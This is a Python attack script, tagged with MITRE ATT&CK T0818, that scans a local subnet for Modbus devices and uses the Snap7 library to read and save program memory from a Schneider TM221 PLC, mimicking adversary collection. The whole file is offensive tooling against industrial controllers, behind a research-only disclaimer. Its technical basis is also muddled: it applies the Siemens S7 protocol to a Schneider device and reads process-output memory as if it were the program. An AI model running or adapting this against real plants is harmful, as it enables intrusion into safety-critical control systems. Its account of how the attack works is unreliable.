import snap7
import struct
import socket
import re

# MITRE ATT&CK Technique: Collection - Program Upload (T0818)
# Description: This script simulates uploading a PLC program from a Schneider Electric TM221CE16R PLC
# using the Snap7 library, mimicking adversary behavior.
#
# Disclaimer: This script is for educational and research purposes only.  Do not use it in unauthorized
# environments.  Uploading PLC programs without proper authorization is illegal and potentially dangerous.

# Configuration -  May need adjustment based on your specific setup.
PLC_RACK = 0
PLC_SLOT = 1
LOCAL_TSAP = 0x0300 # Example TSAP
SERVER_TSAP = 0x0100 # Example TSAP
#PLC_IP_ADDRESS = "192.168.9.24"  # The PLC's IP Address, use discovery if needed.

def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network
    for Modbus devices on port 502.  This is a rudimentary approach and
    may not be reliable in all network configurations.

    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    print("[+] Attempting to discover PLC IP address...")
    for i in range(1, 255): # Scan the 192.168.9.x range, adjust as needed.
        ip = f"192.168.9.{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Quick timeout to avoid hanging
            result = sock.connect_ex((ip, 502)) # Modbus default port
            if result == 0: # Connection successful, likely a Modbus device.
                print(f"[+] Found Modbus device at: {ip}")
                sock.close()
                return ip #Assuming the Modbus device found is our PLC.
            sock.close()
        except socket.error:
            pass
    print("[-] PLC IP address discovery failed.")
    return None


def upload_program(plc_ip_address, output_file="plc_program.bin"):
    """
    Connects to the PLC, reads the program memory, and saves it to a file.

    Args:
        plc_ip_address (str): The IP address of the PLC.
        output_file (str): The name of the file to save the program to.
    """
    try:
        plc = snap7.client.Client()

        # Connect to the PLC
        plc.set_connection_params(plc_ip_address, PLC_RACK, PLC_SLOT)
        plc.set_tsap(LOCAL_TSAP, SERVER_TSAP) #TSAP settings
        plc.connect(plc_ip_address, PLC_RACK, PLC_SLOT)
        print(f"[+] Connected to PLC at: {plc_ip_address}")

        # Determine PLC type and memory size (approximation for demonstration)
        plc_info = plc.get_cpu_info()
        print(f"[+] PLC Info: {plc_info}")
        # The TM221CE16R is an ARM-based PLC. The following is a rough estimate for memory.
        # A real attack would require deeper understanding of the PLC architecture.
        program_memory_size = 65536  # Start with 64KB, adjust as needed.

        # Read the program memory
        print(f"[+] Reading {program_memory_size} bytes of program memory...")
        program_data = plc.read_area(snap7.types.Areas.PA, 0, 0, program_memory_size) #Try PA area first

        if not program_data: #If empty, try DB
            program_data = plc.db_read(1, 0, program_memory_size)

        # Save the program data to a file
        with open(output_file, "wb") as f:
            f.write(program_data)
        print(f"[+] Program uploaded and saved to: {output_file}")

    except snap7.exceptions.Snap7Exception as e:
        print(f"[-] Error communicating with PLC: {e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            print("[+] Disconnected from PLC.")

if __name__ == "__main__":

    plc_ip = discover_plc_ip()

    if not plc_ip:
      print("[-] PLC IP address not provided.  Please run with the correct IP or enable discovery.")
      #plc_ip = input("Enter PLC IP Address: ")  # Prompt for manual entry
      exit()

    upload_program(plc_ip)